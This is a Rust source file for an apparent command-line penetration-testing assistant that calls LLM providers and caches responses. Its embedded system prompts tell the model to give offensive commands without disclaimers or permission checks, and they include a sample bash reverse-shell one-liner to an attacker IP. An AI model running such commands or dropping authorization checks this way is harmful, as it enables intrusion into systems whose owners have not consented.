use crate::{
    cache::{CacheStorage, QueryNormalizer},
    cli::CliContext,
    config::Config,
    llm::{GroqProvider, LLMProvider, Message, OllamaProvider, PerplexityProvider},
    ui::Display,
};
use anyhow::Result;
use colored::Colorize;

pub struct InteractiveSession {
    context: CliContext,
    provider: Box<dyn LLMProvider>,
}

impl InteractiveSession {
    pub fn new(config: Config, context: CliContext) -> Result<Self> {
        // Initialize LLM provider based on config
        let provider: Box<dyn LLMProvider> = match config.provider {
            crate::config::LLMProvider::Groq => {
                let api_key = config
                    .api_keys
                    .groq
                    .clone()
                    .ok_or_else(|| anyhow::anyhow!("Groq API key not configured"))?;
                Box::new(GroqProvider::new(api_key)?)
            }
            crate::config::LLMProvider::Perplexity => {
                let api_key = config
                    .api_keys
                    .perplexity
                    .clone()
                    .ok_or_else(|| anyhow::anyhow!("Perplexity API key not configured"))?;
                Box::new(PerplexityProvider::new(api_key)?)
            }
            crate::config::LLMProvider::Ollama => {
                Box::new(OllamaProvider::new(config.ollama.clone())?)
            }
        };

        Ok(Self { context, provider })
    }

    /// Run a one-shot query (non-interactive)
    pub fn one_shot(config: Config, query: &str, context: CliContext) -> Result<()> {
        // Check cache if enabled
        if config.cache.enabled {
            let cache_dir = Config::cache_dir()?;
            let storage = CacheStorage::new(&cache_dir)?;
            let normalizer = QueryNormalizer::with_defaults()?;

            // Normalize query and compute hash
            let normalized = normalizer.normalize(query)?;
            let hash = normalizer.compute_hash(&normalized);

            // Check if we have a cached response (exact match)
            if let Some(cached) = storage.get_by_hash(&hash)? {
                if !context.quiet {
                    Display::info("[*] Cache hit! (exact match)");
                }

                // Display cached response
                Display::stream_box_section("RESPONSE", &cached.response);

                if !context.quiet {
                    println!();
                    Display::sources_with_links(
                        &cached.provider,
                        &cached.model,
                        false, // We don't track web search for cache
                        &[],   // No sources in cache
                    );
                    println!();
                    println!(
                        "{}",
                        format!(
                            "Cached {} ago • Accessed {} times",
                            format_duration_ago(&cached.created_at),
                            cached.access_count
                        )
                        .dimmed()
                    );
                }

                return Ok(());
            }

            // Try vector similarity search
            let similar_results =
                storage.search_similar(&normalized, config.cache.similarity_threshold, 1)?;
            if let Some((cached, similarity)) = similar_results.first() {
                if !context.quiet {
                    Display::info(&format!(
                        "[*] Cache hit! (similar match: {:.0}%)",
                        similarity * 100.0
                    ));
                }

                // Display cached response
                Display::stream_box_section("RESPONSE", &cached.response);

                if !context.quiet {
                    println!();
                    Display::sources_with_links(&cached.provider, &cached.model, false, &[]);
                    println!();
                    println!(
                        "{}",
                        format!("Similar to: \"{}\"", cached.query_original).dimmed()
                    );
                    println!(
                        "{}",
                        format!(
                            "Cached {} ago • Accessed {} times",
                            format_duration_ago(&cached.created_at),
                            cached.access_count
                        )
                        .dimmed()
                    );
                }

                return Ok(());
            } else if !context.quiet {
                Display::info("Cache miss - calling API...");
            }

            // Cache miss - make API call
            let session = Self::new(config.clone(), context.clone())?;
            let response = session.process_query_and_return(query)?;

            // Store in cache
            storage.store(
                query,
                &normalized,
                &hash,
                &response,
                session.provider.name(),
                session.provider.model(),
            )?;

            if !context.quiet {
                println!();
                println!("{}", "✓ Response cached for future use".dimmed());
            }
        } else {
            // Cache disabled - just process query
            let session = Self::new(config, context)?;
            session.process_query(query)?;
        }

        Ok(())
    }

    fn process_query_and_return(&self, query: &str) -> Result<String> {
        use std::io::{self, Write};
        use std::sync::{Arc, Mutex};

        // Build conversation with system prompt
        let system_prompt = if self.context.learn {
            Self::create_learn_system_prompt()
        } else {
            Self::create_system_prompt()
        };

        let messages = vec![Message::system(system_prompt), Message::user(query)];

        // Create progress bar
        let pb = if self.context.should_show_progress() && !self.context.no_tty {
            Some(Arc::new(Display::create_progress_bar(
                "Getting response...",
            )))
        } else {
            None
        };

        // Track full response
        let full_response = Arc::new(Mutex::new(String::new()));
        let full_response_clone = full_response.clone();

        // Track state for streaming
        let line_buffer = Arc::new(Mutex::new(String::new()));
        let in_code_block = Arc::new(Mutex::new(false));
        let sources_started = Arc::new(Mutex::new(false));
        let box_closed = Arc::new(Mutex::new(false));
        let box_header_printed = Arc::new(Mutex::new(false));
        let sources_header_printed = Arc::new(Mutex::new(false));
        let char_count = Arc::new(Mutex::new(0));
        let quiet = self.context.quiet;
        let no_tty = self.context.no_tty;

        let line_buffer_clone = line_buffer.clone();
        let in_code_block_clone = in_code_block.clone();
        let sources_started_clone = sources_started.clone();
        let box_closed_clone = box_closed.clone();
        let box_header_printed_clone = box_header_printed.clone();
        let sources_header_printed_clone = sources_header_printed.clone();
        let char_count_clone = char_count.clone();
        let pb_clone = pb.clone();

        let provider_name = self.provider.name().to_string();
        let model_name = self.provider.model().to_string();
        let searches_web = self.provider.searches_web();

        self.provider.send_message_stream(
            &messages,
            Box::new(move |chunk| {
                // Store full response
                full_response_clone.lock().unwrap().push_str(chunk);

                // Update character count and progress bar
                let mut count = char_count_clone.lock().unwrap();
                *count += chunk.len();

                // Update progress bar periodically
                if (*count).is_multiple_of(50) || *count < 50 {
                    if let Some(ref progress) = pb_clone {
                        progress.set_message(format!("Streaming... {} chars", *count));
                    }
                }

                if quiet || no_tty {
                    print!("{}", chunk);
                    io::stdout().flush().unwrap();
                } else {
                    let mut buffer = line_buffer_clone.lock().unwrap();
                    let mut in_code = in_code_block_clone.lock().unwrap();
                    let mut sources_started = sources_started_clone.lock().unwrap();
                    let mut box_closed = box_closed_clone.lock().unwrap();
                    let mut box_header_printed = box_header_printed_clone.lock().unwrap();
                    let mut sources_header_printed = sources_header_printed_clone.lock().unwrap();

                    // Print box header on first chunk
                    if !*box_header_printed {
                        if let Some(ref progress) = pb_clone {
                            progress.finish_and_clear();
                        }
                        Display::stream_box_header("RESPONSE");
                        print!("{} ", "│".cyan());
                        io::stdout().flush().unwrap();
                        *box_header_printed = true;
                    }

                    for ch in chunk.chars() {
                        if ch == '\n' {
                            // Check if we've hit the [SOURCES] section
                            if buffer.trim() == "[SOURCES]" {
                                *sources_started = true;
                                if !*box_closed {
                                    println!();
                                    Display::stream_box_footer();
                                    println!();
                                    *box_closed = true;
                                }

                                if !*sources_header_printed {
                                    Display::print_sources_header(
                                        &provider_name,
                                        &model_name,
                                        searches_web,
                                    );
                                    *sources_header_printed = true;
                                }

                                buffer.clear();
                                continue;
                            }

                            // If we're in sources section, print links with animation
                            if *sources_started {
                                let line = buffer.trim();
                                if let Some(stripped) = line.strip_prefix("- ") {
                                    Display::print_link_animated(stripped);
                                }
                                buffer.clear();
                                continue;
                            }

                            // Inside the response box - print with smooth animation
                            if buffer.trim().starts_with("```") {
                                *in_code = !*in_code;
                                Display::print_line_animated(&buffer, true, false);
                            } else if *in_code {
                                Display::print_line_animated(&buffer, false, true);
                            } else {
                                Display::print_line_animated(&buffer, false, false);
                            }
                            buffer.clear();
                            print!("{} ", "│".cyan());
                            io::stdout().flush().unwrap();
                        } else {
                            buffer.push(ch);
                        }
                    }
                }
            }),
        )?;

        // Print any remaining buffer content
        if !self.context.quiet && !self.context.no_tty {
            let buffer = line_buffer.lock().unwrap();
            let box_closed = box_closed.lock().unwrap();

            if !buffer.is_empty() {
                let sources_started = sources_started.lock().unwrap();
                if *sources_started {
                    let line = buffer.trim();
                    if let Some(stripped) = line.strip_prefix("- ") {
                        Display::print_link_animated(stripped);
                    }
                } else {
                    let in_code = in_code_block.lock().unwrap();
                    if *in_code {
                        Display::print_line_animated(&buffer, false, true);
                    } else {
                        Display::print_line_animated(&buffer, false, false);
                    }
                }
            }

            if !*box_closed {
                println!();
                Display::stream_box_footer();
            }

            println!();
        } else if self.context.quiet {
            println!();
        }

        let response = full_response.lock().unwrap().clone();
        Ok(response)
    }

    fn process_query(&self, query: &str) -> Result<()> {
        self.process_query_and_return(query)?;
        Ok(())
    }

    fn _process_query_old(&self, query: &str) -> Result<()> {
        use std::io::{self, Write};
        use std::sync::{Arc, Mutex};

        // Build conversation with system prompt
        let system_prompt = if self.context.learn {
            Self::create_learn_system_prompt()
        } else {
            Self::create_system_prompt()
        };

        let messages = vec![Message::system(system_prompt), Message::user(query)];

        // Create progress bar
        let pb = if self.context.should_show_progress() && !self.context.no_tty {
            Some(Arc::new(Display::create_progress_bar(
                "Getting response...",
            )))
        } else {
            None
        };

        // Track state for streaming
        let line_buffer = Arc::new(Mutex::new(String::new()));
        let in_code_block = Arc::new(Mutex::new(false));
        let sources_started = Arc::new(Mutex::new(false));
        let box_closed = Arc::new(Mutex::new(false));
        let box_header_printed = Arc::new(Mutex::new(false));
        let sources_header_printed = Arc::new(Mutex::new(false));
        let char_count = Arc::new(Mutex::new(0));
        let quiet = self.context.quiet;
        let no_tty = self.context.no_tty;

        let line_buffer_clone = line_buffer.clone();
        let in_code_block_clone = in_code_block.clone();
        let sources_started_clone = sources_started.clone();
        let box_closed_clone = box_closed.clone();
        let box_header_printed_clone = box_header_printed.clone();
        let sources_header_printed_clone = sources_header_printed.clone();
        let char_count_clone = char_count.clone();
        let pb_clone = pb.clone();

        let provider_name = self.provider.name().to_string();
        let model_name = self.provider.model().to_string();
        let searches_web = self.provider.searches_web();

        let _response = self.provider.send_message_stream(
            &messages,
            Box::new(move |chunk| {
                // Update character count and progress bar
                let mut count = char_count_clone.lock().unwrap();
                *count += chunk.len();

                // Update progress bar periodically
                if (*count).is_multiple_of(50) || *count < 50 {
                    if let Some(ref progress) = pb_clone {
                        progress.set_message(format!("Streaming... {} chars", *count));
                    }
                }

                if quiet || no_tty {
                    print!("{}", chunk);
                    io::stdout().flush().unwrap();
                } else {
                    let mut buffer = line_buffer_clone.lock().unwrap();
                    let mut in_code = in_code_block_clone.lock().unwrap();
                    let mut sources_started = sources_started_clone.lock().unwrap();
                    let mut box_closed = box_closed_clone.lock().unwrap();
                    let mut box_header_printed = box_header_printed_clone.lock().unwrap();
                    let mut sources_header_printed = sources_header_printed_clone.lock().unwrap();

                    // Print box header on first chunk
                    if !*box_header_printed {
                        if let Some(ref progress) = pb_clone {
                            progress.finish_and_clear();
                        }
                        Display::stream_box_header("RESPONSE");
                        print!("{} ", "│".cyan());
                        io::stdout().flush().unwrap();
                        *box_header_printed = true;
                    }

                    for ch in chunk.chars() {
                        if ch == '\n' {
                            // Check if we've hit the [SOURCES] section
                            if buffer.trim() == "[SOURCES]" {
                                *sources_started = true;
                                if !*box_closed {
                                    println!();
                                    Display::stream_box_footer();
                                    println!();
                                    *box_closed = true;
                                }

                                if !*sources_header_printed {
                                    // Print sources header with animation
                                    Display::print_sources_header(
                                        &provider_name,
                                        &model_name,
                                        searches_web,
                                    );
                                    *sources_header_printed = true;
                                }

                                buffer.clear();
                                continue;
                            }

                            // If we're in sources section, print links with animation
                            if *sources_started {
                                let line = buffer.trim();
                                if let Some(stripped) = line.strip_prefix("- ") {
                                    Display::print_link_animated(stripped);
                                }
                                buffer.clear();
                                continue;
                            }

                            // Inside the response box - print with smooth animation
                            if buffer.trim().starts_with("```") {
                                *in_code = !*in_code;
                                Display::print_line_animated(&buffer, true, false);
                            } else if *in_code {
                                Display::print_line_animated(&buffer, false, true);
                            } else {
                                Display::print_line_animated(&buffer, false, false);
                            }
                            buffer.clear();
                            print!("{} ", "│".cyan());
                            io::stdout().flush().unwrap();
                        } else {
                            buffer.push(ch);
                        }
                    }
                }
            }),
        )?;

        // Print any remaining buffer content
        if !self.context.quiet && !self.context.no_tty {
            let buffer = line_buffer.lock().unwrap();
            let box_closed = box_closed.lock().unwrap();

            if !buffer.is_empty() {
                let sources_started = sources_started.lock().unwrap();
                if *sources_started {
                    // Remaining link content
                    let line = buffer.trim();
                    if let Some(stripped) = line.strip_prefix("- ") {
                        Display::print_link_animated(stripped);
                    }
                } else {
                    // Remaining response content
                    let in_code = in_code_block.lock().unwrap();
                    if *in_code {
                        Display::print_line_animated(&buffer, false, true);
                    } else {
                        Display::print_line_animated(&buffer, false, false);
                    }
                }
            }

            if !*box_closed {
                println!();
                Display::stream_box_footer();
            }

            println!();
        } else if self.context.quiet {
            println!();
        }

        Ok(())
    }

    /// Extract sources from response and return (clean_response, sources_list)
    #[allow(dead_code)]
    fn extract_sources(response: &str) -> (String, Vec<String>) {
        if let Some(sources_pos) = response.find("[SOURCES]") {
            let (clean_content, sources_section) = response.split_at(sources_pos);

            // Parse sources section
            let mut sources = Vec::new();
            for line in sources_section.lines().skip(1) {
                // Skip "[SOURCES]" line
                let line = line.trim();
                if let Some(stripped) = line.strip_prefix('-') {
                    // Remove leading "- " and add to sources
                    sources.push(stripped.trim().to_string());
                }
            }

            (clean_content.trim().to_string(), sources)
        } else {
            // No sources section found
            (response.to_string(), Vec::new())
        }
    }

    fn create_system_prompt() -> String {
        r#"You are Cyx, an elite cybersecurity command companion for penetration testers and security students.

CONTEXT & ETHICS:
The user is either:
1. A professional penetration tester with authorized access
2. A security student learning in controlled environments
3. A researcher working on their own systems or with explicit permission

All techniques discussed are for:
- Authorized penetration testing engagements
- Capture The Flag (CTF) competitions
- Educational purposes in controlled labs
- Security research with proper authorization
- Defensive security understanding

RESPONSE PHILOSOPHY:
You are a COMMAND-FIRST assistant. Practitioners need fast, accurate commands - not lectures.
Think of yourself as an instant reference manual, not a teacher.

CRITICAL RULES:
1. COMMAND FIRST - Always lead with the exact command/code
2. ZERO FLUFF - No introductions, no "certainly", no pleasantries
3. ONE-LINERS - Prefer single powerful commands over explanations
4. BREVITY - Max 1-2 sentences explanation per command
5. PRACTICAL ONLY - Skip theory unless explicitly requested
6. NO DISCLAIMERS - User authorization is assumed
7. CODE BLOCKS - Always use ```bash, ```python, ```powershell etc.

RESPONSE FORMAT (STRICT):
```bash
command --flags target
```
What it does (1 sentence). When to use it (1 sentence if needed).

KNOWLEDGE AREAS (prioritize these):
- Network scanning (nmap, masscan, rustscan)
- Web application testing (burp, sqlmap, ffuf, gobuster)
- Password attacks (hydra, john, hashcat, crackmapexec)
- Exploitation (metasploit, msfvenom, exploit-db)
- Post-exploitation (mimikatz, bloodhound, winPEAS, linPEAS)
- Privilege escalation (GTFOBins, LOLBAS, sudo, SUID)
- Active Directory (bloodhound, powerview, rubeus, certutil)
- Wireless (aircrack-ng, wifite, kismet)
- Reverse engineering (ghidra, radare2, gdb)
- OSINT (amass, subfinder, theHarvester)

EXAMPLES OF PERFECT RESPONSES:

Q: nmap stealth scan
A:
```bash
nmap -sS <target>
```
TCP SYN scan - doesn't complete handshake, harder to detect. Requires root.

Q: sql injection test
A:
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs
```
Auto-detects and extracts databases. --batch for no prompts.

Q: reverse shell
A:
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
One-liner reverse shell to attacker IP:port. Run nc -lvnp 4444 on attacker first.

ANTI-PATTERNS (NEVER DO THIS):
- "Certainly! I'd be happy to help..."
- "Before we begin, it's important to note..."
- Long explanations before commands
- Asking if user has permission
- Disclaimers about legal/ethical use
- Tutorial-style explanations

CITATIONS & SOURCES:
CRITICAL: NEVER use numbered references like [1], [2], [3] in your responses.

At the very END of your response, after all content, include a sources section in this EXACT format:

[SOURCES]
- Description: Full URL
- Description: Full URL

Example:
[SOURCES]
- nmap documentation: https://nmap.org/book/
- RFC 793 (TCP): https://www.ietf.org/rfc/rfc793.txt

Keep your main response clean without inline citations. Save ALL source links for the [SOURCES] section at the end.

REMEMBER: Pentesters are under time pressure. Every second counts. Fast, accurate commands save engagements."#.to_string()
    }

    fn create_learn_system_prompt() -> String {
        r#"You are Cyx in LEARN MODE - an educational cybersecurity command companion for penetration testers and security students.

CONTEXT & ETHICS:
The user is either:
1. A professional penetration tester with authorized access
2. A security student learning in controlled environments
3. A researcher working on their own systems or with explicit permission

All techniques discussed are for:
- Authorized penetration testing engagements
- Capture The Flag (CTF) competitions
- Educational purposes in controlled labs
- Security research with proper authorization
- Defensive security understanding

RESPONSE PHILOSOPHY - LEARN MODE:
In learn mode, you provide BOTH the command AND a detailed educational breakdown.
Help the user understand not just WHAT to run, but HOW it works and WHY.

RESPONSE FORMAT (STRICT):

First, provide the command as usual:
```bash
command --flags target
```
Brief explanation (1-2 sentences).

Then, provide a detailed breakdown under these headers:

Tool: [tool name]
  Detailed description, author, purpose, license

Flags:
  --flag-name    Detailed explanation of what this flag does
                 - How it works technically
                 - Requirements or prerequisites
                 - Performance characteristics

How it works:
  Step-by-step technical explanation of the process

Advantages:
  - Why you'd use this approach
  - Performance benefits
  - Stealth considerations

Disadvantages:
  - Limitations
  - Detection risks
  - Requirements that might not be met

When to use:
  Specific scenarios and use cases

Alternatives:
  Other commands/approaches and when to use them instead

Example usage:
  Real-world examples with actual syntax

IMPORTANT REQUIREMENTS:
1. Be ACCURATE - Only provide factually correct information
2. CITE SOURCES - NEVER use numbered references like [1][2][3]. Instead:
   - Use full URLs: "nmap documentation (https://nmap.org/book/)"
   - Use clear names: "According to RFC 793 (TCP specification)..."
   - Use inline citations: "Source: HackTricks (book.hacktricks.xyz)"
   - Provide actual URLs or document names, NOT bracketed numbers
3. FLAG BREAKDOWN - Explain every flag in detail
4. TECHNICAL DEPTH - Explain how things work at a protocol/system level
5. PRACTICAL EXAMPLES - Show real-world usage with actual syntax
6. ALTERNATIVES - Always mention other tools/techniques
7. CONTEXT - Explain when to use vs when not to use

EXAMPLE LEARN MODE RESPONSE:

Q: nmap stealth scan
A:
```bash
nmap -sS <target>
```
TCP SYN scan - doesn't complete handshake, harder to detect. Requires root.

Tool: nmap (Network Mapper)
  Industry-standard network scanner for reconnaissance and security auditing
  Created by Gordon Lyon (Fyodor)
  Open source (GPL license)
  Available on Linux, Windows, macOS

Flags:
  -sS    TCP SYN Scan (Stealth Scan)
         - Sends TCP SYN packet to each target port
         - Waits for SYN-ACK (open) or RST (closed) response
         - Sends RST to close connection before handshake completes
         - Requires root/sudo for raw socket access
         - Faster than full TCP connect scan (-sT)
         - May not be logged by some older systems

  <target>  Target specification
           - Single IP: 192.168.1.1
           - Hostname: example.com
           - CIDR range: 10.0.0.0/24
           - Multiple: 192.168.1.1-50

How it works:
  1. Sends TCP SYN packet to target port
  2. If port open: receives SYN-ACK, marks as open, sends RST
  3. If port closed: receives RST, marks as closed
  4. If filtered: no response or ICMP unreachable

Advantages:
  - Fast: doesn't complete full TCP three-way handshake
  - Stealthy: may not appear in application logs
  - Reliable: accurately distinguishes open/closed/filtered states
  - Default scan type for most nmap users

Disadvantages:
  - Requires root/sudo privileges (raw sockets)
  - Can be detected by modern IDS/IPS systems
  - Some firewalls may block or rate-limit SYN packets
  - Won't bypass SYN flood protection

When to use:
  - Default choice for most port scans
  - When you have root access
  - Initial network reconnaissance
  - When you need speed over stealth

Alternatives:
  -sT    TCP connect scan (no root needed, but slower and logged)
  -sN    TCP NULL scan (may bypass some firewalls)
  -sF    TCP FIN scan (may bypass some firewalls)
  -sA    TCP ACK scan (for firewall rule mapping)

Example usage:
  nmap -sS 192.168.1.100              # Single host
  nmap -sS 192.168.1.0/24             # Entire subnet
  nmap -sS -p 22,80,443 example.com   # Specific ports
  nmap -sS -p- example.com            # All 65535 ports

[SOURCES]
- nmap official documentation: https://nmap.org/book/
- RFC 793 (TCP specification): https://www.ietf.org/rfc/rfc793.txt
- nmap man page: https://linux.die.net/man/1/nmap

CRITICAL - CITATION FORMAT:
NEVER use numbered references like [1], [2], [3] anywhere in your response.

At the very END of your response, after ALL content, include sources in this EXACT format:

[SOURCES]
- Description: Full URL
- Description: Full URL

Keep your main response body clean. Save ALL source URLs for the [SOURCES] section at the very end.

REMEMBER: LEARN MODE is about education. Be thorough, accurate, and cite sources with FULL URLs in the [SOURCES] section at the end."#.to_string()
    }
}

fn format_duration_ago(datetime: &chrono::DateTime<chrono::Utc>) -> String {
    let now = chrono::Utc::now();
    let duration = now.signed_duration_since(*datetime);

    if duration.num_seconds() < 60 {
        "just now".to_string()
    } else if duration.num_minutes() < 60 {
        let mins = duration.num_minutes();
        format!("{} minute{} ago", mins, if mins == 1 { "" } else { "s" })
    } else if duration.num_hours() < 24 {
        let hours = duration.num_hours();
        format!("{} hour{} ago", hours, if hours == 1 { "" } else { "s" })
    } else if duration.num_days() < 30 {
        let days = duration.num_days();
        format!("{} day{} ago", days, if days == 1 { "" } else { "s" })
    } else {
        let months = duration.num_days() / 30;
        format!("{} month{} ago", months, if months == 1 { "" } else { "s" })
    }
}
